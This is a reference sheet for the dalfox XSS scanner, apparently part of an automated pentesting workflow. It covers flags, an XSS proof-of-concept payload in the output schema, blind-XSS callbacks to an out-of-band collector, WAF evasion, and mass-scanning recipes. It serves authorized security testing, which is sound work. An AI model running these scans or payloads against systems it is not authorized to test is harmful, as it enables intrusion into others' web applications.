# dalfox reference

dalfox (Dal = moon, by hahwul) is the pipeline-grade XSS scanner: parameter analysis +
mining, context-aware payload generation, optional headless-browser verification, and
machine-readable output. Modern CLI: **everything goes through `dalfox scan`**; the old
`url` / `file` / `pipe` verbs still work but are hidden aliases for `scan -i url|file|pipe`.

## Invocation forms

```sh
dalfox scan "https://example.com/search?q=test"          # single URL
dalfox scan -i file urls.txt                             # file of URLs
cat urls.txt | dalfox scan                               # stdin pipe
dalfox scan -i sxss -X POST -d 'content=test' \
  --sxss-url "https://example.com/board/1" "https://example.com/board/write"   # stored
```

## Flags that matter

### Targeting / request shaping
| Flag | Meaning |
|---|---|
| `-p, --param q` | restrict testing to parameter(s); repeatable |
| `-X, --method POST` | HTTP method |
| `-d, --data 'a=1&b=2'` | request body (form or raw) |
| `-H, --header "Name: value"` | extra header; repeatable |
| `--cookies "k=v; k2=v2"` | cookies — **note the s; `--cookie` does not exist** |
| `--cookie-from-raw req.txt` | lift cookies from a raw request file |
| `--user-agent "..."` | UA override |
| `--proxy http://127.0.0.1:8080` | route through Burp/mitmproxy for capture |
| `--timeout 10`, `--delay 0`, `--worker 100` | timing/concurrency |
| `-F, --follow-redirects` | follow 3xx |

### Discovery / mining
| Flag | Meaning |
|---|---|
| (default) | mines params from GF-patterns dictionary + DOM analysis |
| `-W, --mining-dict-word words.txt` | custom mining wordlist |
| `--skip-mining-dict` / `--skip-mining-dom` / `--skip-mining-all` | disable mining |
| `--skip-discovery` | skip discovery entirely, needs `-p` |
| `--skip-bav` | skip the basic-another-vuln checks (SQLi/SSTI/CRLF greps) |
| `--skip-xss-scanning` | discovery only — emits reflected params, no payloads (the Gxss replacement) |
| `--only-discovery` | alias of the above (older spelling) |

### Attack modes
| Flag | Meaning |
|---|---|
| `-b, --blind https://<id>.oast.pro` | add blind-XSS payloads calling back to your collector |
| `--sxss` + `--sxss-url URL` | stored mode: inject at target, verify at `--sxss-url` |
| `--custom-payload file.txt` | your payload list (one per line) |
| `--only-custom-payload` | use only those |
| `--waf-evasion` | throttle/mutate when a WAF is detected |
| `--deep-scan` (older: `--deep-domxss`) | heavier DOM/edge-case testing |
| `--use-headless=false` | disable browser verification (faster, loses `type:V`) |
| `--har-file-path out.har` | record every request/response as HAR — great evidence |

### Output
| Flag | Meaning |
|---|---|
| `-o out.json` | write results to file |
| `-f, --format plain\|json\|jsonl\|markdown\|sarif` | output format — use `json` or `jsonl` for the pipeline |
| `-S, --silence` | suppress banner/progress (clean stdout) |
| `--report --report-format json` | summary report block |
| `--debug` | verbose troubleshooting |

## Output schema (json / jsonl)

Each result (array element in `json`, line in `jsonl`):

```json
{
  "type": "V",
  "inject_type": "inHTML-URL",
  "poc_type": "plain",
  "method": "GET",
  "data": "https://example.com/search?q=%3Cimg+src%3Dx+onerror%3Dalert.apply%28null%2C1%29%3E",
  "param": "q",
  "payload": "<img src=x onerror=alert.apply(null,1)>",
  "evidence": "48 line:  <p>Results for <img src=x onerror=alert.apply(null,1)></p>",
  "cwe": "CWE-79",
  "severity": "High",
  "message_id": 519,
  "message_str": "Triggered XSS Payload (found dialog in headless)"
}
```

Field semantics:
- `type` — `V` verified: headless browser observed `alert`/dialog execution → report as
  exploited. `R` reflected: payload came back unencoded → verify manually (open `data` in a
  browser) before claiming execution. `G` grep: a BAV/pattern hit (SSTI/CRLF/sqli error
  strings) — a lead for the matching sibling skill, not an XSS finding.
- `inject_type` — reflection context: `inHTML` (body), `inATTR` (attribute), `inJS`
  (script string), `inPATTERN`, and DOM variants. Drives which break-out worked; include it
  in the finding rationale.
- `data` — the complete PoC URL (or request for POST). This is `target_ref` for the finding.
- `evidence` — the response line showing the reflection; pair it with the request line
  (`method` + `data`) to satisfy the HTTP-exchange evidence requirement.

Plain format emits lines like `[POC][V][inHTML][GET] https://example.com/...` — parseable
but lossy; prefer json/jsonl.

## Recipes

Authenticated POST scan with blind fallback and HAR evidence:
```sh
dalfox scan "https://example.com/comment" -X POST -d 'body=test&submit=1' \
  --cookies "session=abc123" -b "https://c8ilp0a.oast.pro" \
  --har-file-path comment.har -o comment.json -f json -S
```

Mass pipeline from passive URLs:
```sh
gau example.com | grep '=' | sort -u | dalfox scan -f jsonl -o all.jsonl -S --worker 50
```

Discovery-only to seed other tools:
```sh
cat urls.txt | dalfox scan --skip-xss-scanning -f jsonl -o reflected.jsonl -S
```

Then always: `python3 scripts/parse_dalfox.py all.jsonl --out norm.json --work-units units.json --findings findings.json --assets assets.json` (see `rupu.md`).
